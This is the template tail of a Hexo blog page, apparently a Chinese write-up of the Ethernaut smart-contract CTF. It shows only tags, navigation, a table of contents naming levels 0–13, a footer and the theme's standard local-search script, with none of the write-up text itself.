            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/Crypto/" rel="tag"># Crypto</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/01/08/hello-world/" rel="next" title="Hello World">
                <i class="fa fa-chevron-left"></i> Hello World
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/01/09/RSA攻击综述/" rel="prev" title="RSA攻击综述">
                RSA攻击综述 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Vergissmeinnicht">
          <p class="site-author-name" itemprop="name">Vergissmeinnicht</p>
           
              <p class="site-description motion-element" itemprop="description">Kap0k/De1ta/Crypto</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">15</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">4</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">12</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-0-Hello-Ethernaut"><span class="nav-text">level 0 - Hello Ethernaut</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步"><span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步"><span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三步"><span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四步"><span class="nav-text">第四步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五步"><span class="nav-text">第五步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第六步"><span class="nav-text">第六步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第七步"><span class="nav-text">第七步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第八步"><span class="nav-text">第八步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第九步"><span class="nav-text">第九步</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-1-Fallback"><span class="nav-text">level 1 - Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注意事项"><span class="nav-text">注意事项</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-1"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-2-Fallout"><span class="nav-text">level 2 - Fallout</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-1"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-1"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-1"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-1"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-1"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-2"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-3-Coin-Flip"><span class="nav-text">level 3 - Coin Flip</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-2"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-2"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-1"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-2"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-2"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-3"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-4-Telephone"><span class="nav-text">level 4- Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-3"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-2"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-3"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-2"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-3"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-3"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-4"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-5-Token"><span class="nav-text">level 5- Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-4"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-3"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-4"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-4"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-4"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-5"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-6-Delegation"><span class="nav-text">level 6- Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-5"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-4"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-5"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-3"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-5"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-5"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-6"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-7-Force"><span class="nav-text">level 7- Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-6"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-5"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-6"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-4"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-6"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-6"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-7"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-8-Vault"><span class="nav-text">level 8- Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-7"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-7"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-5"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-7"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-7"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-8"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-9-King"><span class="nav-text">level 9- King</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-8"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-8"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-6"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-8"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-8"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-9"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-10-Re-entrancy"><span class="nav-text">level 10- Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-9"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-6"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-9"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-9"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-9"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-10"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-11-Elevator"><span class="nav-text">level 11- Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-10"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-7"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-10"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-7"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-10"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-10"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-11"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-12-Privacy"><span class="nav-text">level 12- Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-11"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-8"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-11"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预备知识-8"><span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-11"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体步骤-11"><span class="nav-text">具体步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通关后的彩蛋-12"><span class="nav-text">通关后的彩蛋</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-13-Gatekeeper-One"><span class="nav-text">level 13- Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#胜利条件-12"><span class="nav-text">胜利条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tips-9"><span class="nav-text">tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码-12"><span class="nav-text">源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路-12"><span class="nav-text">解题思路</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Vergissmeinnicht</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Gemini
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  

</body>
</html>
